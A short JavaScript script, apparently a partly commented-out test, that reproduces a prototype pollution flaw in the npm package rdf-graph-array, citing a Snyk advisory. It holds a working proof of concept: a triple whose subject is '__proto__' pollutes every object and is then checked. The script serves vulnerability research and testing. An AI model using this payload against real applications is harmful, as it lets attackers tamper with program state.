
// //https://snyk.io/vuln/SNYK-JS-RDFGRAPHARRAY-551803
// test("prototype pollution in rdf-graph-array", () => {
  const Graph = require("rdf-graph-array").Graph;
  let g = new Graph();

 console.log({}.polluted);

  g.add({
    graph: "foo",
    subject: "__proto__",
    predicate: "polluted",
    object: "JHU",
  });
  if({}.polluted != undefined){
	console.log("yes")
  }else{
	console.log(undefined)
  }
  // console.log({}.polluted)
  //expect({}.polluted).not.toBe(undefined);
// });
